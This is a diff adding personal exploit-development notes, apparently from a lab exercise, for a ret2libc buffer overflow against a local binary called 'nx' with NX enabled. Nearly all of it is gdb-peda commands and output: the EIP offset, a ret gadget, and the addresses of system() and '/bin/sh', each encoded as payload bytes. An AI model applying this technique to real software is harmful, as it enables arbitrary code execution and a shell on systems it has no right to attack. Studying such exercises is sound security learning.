@@ -48,3 +48,43 @@ And exploit. See payloadgen.py, make payload then:
 2. Time to switch on NX and retry.
 
 
+gdb nx
+
+pattern_create 400 patt.txt
+
+r < patt.txt 
+
+EIP: 0x4c414136
+
+gdb-peda$ pattern_offset  0x4c414136
+1279344950 found at offset: 96 - EIP
+
+gdb-peda$ ropgadget 
+ret = 0x80482f2  - this goes into EIP
+
+\xf2\x82\x04\x08
+
+
+
+In ESP register: 
+gdb-peda$ pattern_offset AAhAA7AAMA
+AAhAA7AAMA found at offset: 100  - Here goes the pointer to system and then a pointer to bin sh
+
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0x40085020 <__libc_system>
+
+\x20\x50\x08\x40   - system
+
+
+gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 3 results, display max 3 items:
+  nx : 0x80485ab ("/bin/sh")
+  nx : 0x80495ab ("/bin/sh")
+libc : 0x401a960f ("/bin/sh")
+
+e.g. the last one \x0f\x96\x1a\x40
+
+
+
+
